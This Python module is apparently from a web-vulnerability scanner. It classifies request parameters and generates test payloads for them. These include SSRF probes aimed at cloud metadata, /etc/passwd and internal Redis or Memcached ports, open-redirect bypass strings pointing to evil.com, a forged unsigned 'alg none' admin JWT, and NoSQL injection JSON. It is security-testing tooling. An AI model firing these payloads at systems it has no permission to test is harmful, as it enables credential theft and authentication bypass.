"""Mutation engine for generating parameter-specific test payloads.

This module analyzes parameter types (URL, redirect, token, ID, numeric, JSON, generic)
and generates appropriate mutation payloads for security testing.
"""

import base64
import json
import re
from collections.abc import Iterable
from urllib.parse import urlparse

from src.core.utils.param_types import (
    IDOR_PARAM_NAMES,
    REDIRECT_PARAM_NAMES,
    SSRF_PARAM_NAMES,
    TOKEN_PARAM_NAMES,
    UUID_RE,
    decode_candidate_value,
)

_PARAM_TYPE_URL = "url"
_PARAM_TYPE_REDIRECT = "redirect"
_PARAM_TYPE_TOKEN = "token"  # noqa: S105
_PARAM_TYPE_ID = "id"
_PARAM_TYPE_NUMERIC = "numeric"
_PARAM_TYPE_JSON = "json"
_PARAM_TYPE_GENERIC = "generic"

_INT_RE = re.compile(r"^-?\d+$")


def _looks_json(text: str) -> bool:
    value = (text or "").strip()
    if not value:
        return False
    return (value.startswith("{") and value.endswith("}")) or (
        value.startswith("[") and value.endswith("]")
    )


def _is_numeric(text: str) -> bool:
    return bool(_INT_RE.match((text or "").strip()))


def _is_url_like_value(text: str) -> bool:
    decoded = decode_candidate_value(text)
    lowered = decoded.lower()
    if lowered.startswith(("http://", "https://", "//")):
        return True
    parsed = urlparse(decoded if "://" in decoded else f"http://{decoded}")
    return bool(parsed.netloc and "." in parsed.netloc)


def detect_parameter_type(name: str, value: str) -> str:
    param = str(name or "").strip().lower()
    decoded = decode_candidate_value(value)

    if param in REDIRECT_PARAM_NAMES:
        return _PARAM_TYPE_REDIRECT
    if param in TOKEN_PARAM_NAMES or any(
        token in param for token in ("token", "session", "jwt", "auth")
    ):
        return _PARAM_TYPE_TOKEN
    if param in IDOR_PARAM_NAMES or param.endswith("_id") or param == "id":
        if _is_numeric(decoded):
            return _PARAM_TYPE_NUMERIC
        return _PARAM_TYPE_ID
    if _is_numeric(decoded):
        return _PARAM_TYPE_NUMERIC
    if _looks_json(decoded) or param in {
        "json",
        "payload",
        "data",
        "input",
        "body",
        "where",
        "filter",
        "query",
    }:
        return _PARAM_TYPE_JSON
    if param in SSRF_PARAM_NAMES or _is_url_like_value(decoded):
        return _PARAM_TYPE_URL
    return _PARAM_TYPE_GENERIC


def _dedupe_limit(payloads: Iterable[dict[str, str]], max_payloads: int) -> list[dict[str, str]]:
    """Deduplicate payloads by variant name and enforce maximum payload count.

    Args:
        payloads: Iterable of payload dicts with 'variant' keys.
        max_payloads: Maximum number of unique payloads to return.

    Returns:
        Deduplicated list of payloads, limited to max_payloads.
    """
    seen: set[str] = set()
    out: list[dict[str, str]] = []
    for item in payloads:
        variant = str(item.get("variant", ""))
        if not variant or variant in seen:
            continue
        seen.add(variant)
        out.append(item)
        if len(out) >= max_payloads:
            break
    return out


def _url_payloads(param: str, collaborator_domain: str) -> list[dict[str, str]]:
    collab = collaborator_domain.strip() or "collaborator.example"
    return [
        {"parameter": param, "variant": "http://127.0.0.1", "reason": "ssrf_loopback"},
        {"parameter": param, "variant": "http://localhost", "reason": "ssrf_localhost"},
        {
            "parameter": param,
            "variant": "http://169.254.169.254/latest/meta-data/",
            "reason": "ssrf_metadata",
        },
        {
            "parameter": param,
            "variant": f"https://{collab}/ssrf-probe",
            "reason": "ssrf_external_callback",
        },
        {"parameter": param, "variant": "http://[::1]", "reason": "ssrf_ipv6_loopback"},
        {
            "parameter": param,
            "variant": "gopher://127.0.0.1:6379/",
            "reason": "ssrf_protocol_smuggling",
        },
        {"parameter": param, "variant": "file:///etc/passwd", "reason": "ssrf_file_scheme"},
        {"parameter": param, "variant": "dict://127.0.0.1:11211/", "reason": "ssrf_dict_protocol"},
        {"parameter": param, "variant": "http://10.0.0.1", "reason": "ssrf_internal_network"},
        {"parameter": param, "variant": "http://192.168.1.1", "reason": "ssrf_private_range"},
    ]


def _redirect_payloads(param: str) -> list[dict[str, str]]:
    return [
        {"parameter": param, "variant": "https://evil.com", "reason": "open_redirect_absolute"},
        {"parameter": param, "variant": "//evil.com", "reason": "open_redirect_scheme_relative"},
        {"parameter": param, "variant": "/admin", "reason": "open_redirect_internal_path"},
        {"parameter": param, "variant": "/../admin", "reason": "open_redirect_path_traversal"},
        {
            "parameter": param,
            "variant": "%2F%2Fevil.com",
            "reason": "open_redirect_encoded_scheme_relative",
        },
        {"parameter": param, "variant": "https:evil.com", "reason": "open_redirect_missing_slash"},
        {
            "parameter": param,
            "variant": "/%5C%5Cevil.com",
            "reason": "open_redirect_backslash_bypass",
        },
        {
            "parameter": param,
            "variant": "https://evil.com%2F%2Fexample.com",
            "reason": "open_redirect_encoded_separator",
        },
        {
            "parameter": param,
            "variant": "https://example.com.evil.com",
            "reason": "open_redirect_subdomain_spoof",
        },
        {
            "parameter": param,
            "variant": "https://evil.com%40example.com",
            "reason": "open_redirect_at_sign_bypass",
        },
    ]


def _numeric_payloads(param: str, value: str) -> list[dict[str, str]]:
    decoded = decode_candidate_value(value)
    values = ["0", "-1", "1", "2147483647", "9223372036854775807", "999999999"]
    if _is_numeric(decoded):
        current = int(decoded)
        values.extend([str(current - 1), str(current + 1), str(current * -1), str(abs(current))])
    # Add overflow and underflow values
    values.extend(["-2147483648", "-9223372036854775808", "4294967295", "18446744073709551615"])
    return [{"parameter": param, "variant": v, "reason": "numeric_boundary"} for v in values]


def _id_payloads(param: str, value: str) -> list[dict[str, str]]:
    decoded = decode_candidate_value(value)
    if _is_numeric(decoded):
        n = int(decoded)
        candidates = [str(max(0, n - 1)), str(n + 1), "1", "2", "999999", "0", "-1"]
    else:
        candidates = ["1", "2", "999999", "00000000-0000-4000-8000-000000000000"]
        # Add UUID variations if the value looks like a UUID
        if UUID_RE.search(decoded):
            candidates.extend(
                [
                    "00000000-0000-0000-0000-000000000000",
                    "ffffffff-ffff-4fff-8fff-ffffffffffff",
                    "11111111-1111-4111-8111-111111111111",
                ]
            )
    return [{"parameter": param, "variant": v, "reason": "identifier_neighbor"} for v in candidates]


def _token_payloads(param: str) -> list[dict[str, str]]:
    return [
        {"parameter": param, "variant": "invalid", "reason": "token_tamper"},
        {"parameter": param, "variant": "expired.token.value", "reason": "token_shape_probe"},
        {
            "parameter": param,
            "variant": "eyJhbGciOiJIUzI1NiJ9.invalid.signature",
            "reason": "jwt_tamper",
        },
        {"parameter": param, "variant": " ", "reason": "token_blank"},
        {"parameter": param, "variant": "null", "reason": "token_null_injection"},
        {"parameter": param, "variant": "undefined", "reason": "token_undefined_injection"},
        {"parameter": param, "variant": "none", "reason": "jwt_none_algorithm"},
        {
            "parameter": param,
            "variant": _jwt_none_token(),
            "reason": "jwt_none_algorithm_explicit",
        },
    ]


def _jwt_none_token() -> str:
    header = {"alg": "none", "typ": "JWT"}
    payload = {"sub": "admin"}
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode("utf-8")).decode("ascii")
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode("utf-8")).decode("ascii")
    return f"{header_b64.rstrip('=')}.{payload_b64.rstrip('=')}."


def _json_payloads(param: str, value: str) -> list[dict[str, str]]:
    decoded = decode_candidate_value(value)
    if _looks_json(decoded):
        try:
            base_obj = json.loads(decoded)
        except json.JSONDecodeError:
            base_obj = {"probe": True}
    else:
        base_obj = {"probe": True}

    variants = [
        {"nested": {"probe": True, "depth": 2}},
        {"user": {"id": 1, "role": "admin"}, "meta": {"source": "mutation_engine"}},
        [{"id": 1}, {"id": 2}],
        {"filters": {"where": {"$ne": None}}},
        {"payload": base_obj, "override": {"enabled": True}},
    ]
    return [
        {
            "parameter": param,
            "variant": json.dumps(item, separators=(",", ":")),
            "reason": "json_nested_mutation",
        }
        for item in variants
    ]


def generate_payloads_for_parameter(
    name: str,
    value: str,
    *,
    collaborator_domain: str = "collaborator.example",
    max_payloads: int = 10,
) -> list[dict[str, str]]:
    param = str(name or "").strip().lower()
    decoded = decode_candidate_value(value)
    ptype = detect_parameter_type(param, decoded)

    generated: list[dict[str, str]] = []
    if ptype == _PARAM_TYPE_REDIRECT:
        generated.extend(_redirect_payloads(param))
        generated.extend(_url_payloads(param, collaborator_domain))
    elif ptype == _PARAM_TYPE_URL:
        generated.extend(_url_payloads(param, collaborator_domain))
    elif ptype == _PARAM_TYPE_TOKEN:
        generated.extend(_token_payloads(param))
    elif ptype == _PARAM_TYPE_NUMERIC:
        generated.extend(_numeric_payloads(param, decoded))
    elif ptype == _PARAM_TYPE_ID:
        generated.extend(_id_payloads(param, decoded))
    elif ptype == _PARAM_TYPE_JSON:
        generated.extend(_json_payloads(param, decoded))
    else:
        generated.extend(
            [
                {"parameter": param, "variant": "__probe__", "reason": "generic_probe"},
                {"parameter": param, "variant": "null", "reason": "generic_null_probe"},
            ]
        )

    typed = [{**item, "param_type": ptype} for item in generated]
    return _dedupe_limit(typed, max(1, int(max_payloads)))


def calculate_payload_diversity(payloads: list[dict[str, str]]) -> dict[str, object]:
    """Calculate diversity score for a set of generated payloads.

    A higher diversity score indicates broader coverage across different
    attack vectors (SSRF, redirect, injection, type confusion, etc.).
    Low diversity suggests the payloads are too similar and may miss vulnerabilities.

    Args:
        payloads: List of payload dicts with 'reason' keys.

    Returns:
        Dict with diversity_score (0.0-1.0), unique_reasons, reason_distribution,
        and coverage_gaps (list of missing attack vector categories).
    """
    if not payloads:
        return {
            "diversity_score": 0.0,
            "unique_reasons": 0,
            "reason_distribution": {},
            "coverage_gaps": ["all"],
            "recommendation": "No payloads generated — parameter may need manual testing.",
        }

    # Categorize reasons into attack vector families
    attack_families = {
        "ssrf": {
            "ssrf_",
            "internal_network",
            "private_range",
            "metadata",
            "loopback",
            "localhost",
            "protocol_smuggling",
            "file_scheme",
            "dict_protocol",
        },
        "redirect": {"open_redirect", "redirect"},
        "injection": {
            "null_injection",
            "undefined_injection",
            "prototype_pollution",
            "sqli",
            "xss",
        },
        "auth_bypass": {"jwt_", "token_", "auth_", "none_algorithm"},
        "type_confusion": {"type_confusion", "json_nested", "numeric_boundary"},
        "identifier": {"identifier_neighbor", "uuid_"},
        "overflow": {"overflow", "underflow", "boundary"},
    }

    reasons = [str(p.get("reason", "")).lower() for p in payloads]
    unique_reasons = set(reasons)
    reason_counts: dict[str, int] = {}
    for reason in reasons:
        reason_counts[reason] = reason_counts.get(reason, 0) + 1

    # Calculate family coverage
    covered_families: set[str] = set()
    for reason in unique_reasons:
        for family, keywords in attack_families.items():
            if any(keyword in reason for keyword in keywords):
                covered_families.add(family)

    # Diversity score: combination of unique reason ratio and family coverage
    unique_ratio = len(unique_reasons) / max(len(payloads), 1)
    family_coverage = len(covered_families) / max(len(attack_families), 1)
    diversity_score = round((unique_ratio * 0.4 + family_coverage * 0.6), 2)

    # Identify coverage gaps
    all_families = set(attack_families.keys())
    coverage_gaps = sorted(all_families - covered_families)

    # Generate recommendation
    if diversity_score >= 0.7:
        recommendation = "Good payload diversity — broad attack vector coverage."
    elif diversity_score >= 0.4:
        recommendation = (
            f"Moderate diversity — consider adding payloads for: {', '.join(coverage_gaps[:3])}."
        )
    else:
        recommendation = f"Low diversity — payloads are too similar. Add coverage for: {', '.join(coverage_gaps[:3])}."

    return {
        "diversity_score": diversity_score,
        "unique_reasons": len(unique_reasons),
        "reason_distribution": dict(sorted(reason_counts.items(), key=lambda x: -x[1])[:10]),
        "covered_families": sorted(covered_families),
        "coverage_gaps": coverage_gaps,
        "recommendation": recommendation,
    }
